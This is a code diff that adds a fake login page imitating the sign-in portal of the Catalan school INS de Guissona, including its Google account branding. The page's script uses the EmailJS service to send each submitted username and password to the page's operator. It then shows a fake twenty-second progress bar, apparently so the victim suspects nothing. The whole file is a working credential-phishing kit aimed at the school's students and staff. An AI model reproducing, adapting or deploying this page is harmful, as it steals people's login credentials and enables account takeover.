@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="ca">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Entrar a INS de Guissona</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+  <style>
+    * { box-sizing: border-box; }
+    body { margin: 0; font-family: 'Roboto', sans-serif; background: linear-gradient(to bottom right, #f7f8f9, #e9ecef); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    .container { background-color: #fff; width: 100%; max-width: 420px; padding: 30px; border-radius: 6px; box-shadow: 0 2px 10px rgba(0,0,0,0.08); position: relative; overflow: hidden; }
+    h2 { margin-top: 0; font-size: 20px; text-align: center; color: #333; }
+    label { display: block; margin-bottom: 6px; font-size: 14px; }
+    input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; }
+    button[type="submit"] { width: 100%; background-color: #dc3545; color: white; padding: 10px; border: none; border-radius: 4px; font-weight: bold; font-size: 14px; cursor: pointer; margin-bottom: 10px; }
+    button[type="submit"]:hover { background-color: #c82333; }
+    .link { text-align: left; font-size: 13px; color: #dc3545; margin-bottom: 20px; cursor: pointer; }
+    .divider { border-top: 1px solid #ccc; margin: 20px 0; }
+    .section-label { font-size: 14px; color: #333; margin-bottom: 10px; }
+    .google-login { display: flex; align-items: center; justify-content: center; border: 1px solid #ccc; padding: 8px; border-radius: 4px; cursor: pointer; font-size: 14px; background-color: white; margin-bottom: 20px; }
+    .google-login img { height: 16px; margin-right: 8px; }
+    .guest-section { font-size: 14px; margin-bottom: 20px; color: #333; }
+    .guest-button { background-color: #e2e6ea; border: none; padding: 8px 12px; font-size: 14px; border-radius: 4px; cursor: pointer; }
+    .footer { text-align: center; font-size: 12px; color: #666; border-top: 1px solid #eee; padding-top: 15px; }
+    .footer a { margin-left: 8px; text-decoration: none; color: #444; background: #f0f0f0; padding: 4px 8px; border-radius: 3px; font-size: 12px; }
+    .credits { text-align: center; font-size: 12px; color: #888; margin-top: 20px; line-height: 1.5; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Entrar a INS de Guissona</h2>
+    
+    <!-- Formulari Login -->
+    <form id="loginForm">
+      <input type="text" name="user_name" placeholder="Nom d'usuari" required autocomplete="username" />
+      <input type="password" name="user_password" placeholder="Contrasenya" required autocomplete="current-password" />
+      <button type="submit">Accedir</button>
+    </form>
+
+    <div class="link">Heu oblidat la contrasenya?</div>
+
+    <div class="divider"></div>
+
+    <div class="section-label">Identifiqueu-vos usant el vostre compte a:</div>
+    <div class="google-login">
+      <img src="https://img.icons8.com/color/16/000000/google-logo.png" /> Google (@iesguissona.cat)
+    </div>
+
+    <div class="guest-section">
+      Alguns cursos permeten accedir a convidats <br />
+      <button class="guest-button">Entrar com a persona convidada</button>
+    </div>
+
+    <div class="footer">
+      Espanyol - Internacional (és) <a href="#">Avís de Cookies</a>
+    </div>
+    <div class="credits"></div>
+  </div>
+
+  <script>
+    // Inicialitzar EmailJS
+    emailjs.init("zq9Ku4L0FECKAO_EK");
+
+    // Captura l'enviament del formulari
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      emailjs.sendForm("service_8x8u31g", "template_ou0s71w", this)
+        .then(() => {
+          this.reset();
+
+          // --- Barra de progrés automàtica després de l'enviament ---
+          const progressOverlay = document.createElement("div");
+          progressOverlay.style.position = "absolute";
+          progressOverlay.style.top = 0;
+          progressOverlay.style.left = 0;
+          progressOverlay.style.width = "100%";
+          progressOverlay.style.height = "100%";
+          progressOverlay.style.backgroundColor = "rgba(255,255,255,0.95)";
+          progressOverlay.style.display = "flex";
+          progressOverlay.style.flexDirection = "column";
+          progressOverlay.style.justifyContent = "center";
+          progressOverlay.style.alignItems = "center";
+          progressOverlay.style.zIndex = 10;
+
+          const progressText = document.createElement("div");
+          progressText.style.fontSize = "22px";
+          progressText.style.fontWeight = "bold";
+          progressText.style.color = "#2e7d32"; // verd realista
+          progressText.style.marginBottom = "15px";
+          progressText.textContent = "0%";
+
+          const progressContainer = document.createElement("div");
+          progressContainer.style.width = "80%";
+          progressContainer.style.height = "30px";
+          progressContainer.style.backgroundColor = "#c8e6c9";
+          progressContainer.style.borderRadius = "15px";
+          progressContainer.style.overflow = "hidden";
+          progressContainer.style.boxShadow = "inset 0 0 5px rgba(0,0,0,0.2)";
+
+          const progressBar = document.createElement("div");
+          progressBar.style.height = "100%";
+          progressBar.style.width = "0%";
+          progressBar.style.backgroundColor = "#2e7d32";
+          progressBar.style.borderRadius = "15px";
+          progressBar.style.transition = "width 0.1s linear";
+
+          progressContainer.appendChild(progressBar);
+          progressOverlay.appendChild(progressText);
+          progressOverlay.appendChild(progressContainer);
+          document.querySelector(".container").appendChild(progressOverlay);
+
+          // Animació de 0 a 100 en 20 segons
+          let progress = 0;
+          const duration = 20000; // 20 segons
+          const intervalTime = 50;
+          const increment = (intervalTime / duration) * 100;
+
+          const interval = setInterval(() => {
+            progress += increment;
+            if (progress >= 100) {
+              progress = 100;
+              clearInterval(interval);
+              setTimeout(() => { progressOverlay.style.display = "none"; }, 500);
+            }
+            progressBar.style.width = progress + "%";
+            progressText.textContent = Math.floor(progress) + "%";
+          }, intervalTime);
+
+        }, (error) => {
+          console.error("Error:", error);
+          alert("Error en l'enviament. Comprova EmailJS.");
+        });
+    });
+  </script>
+</body>
+</html>
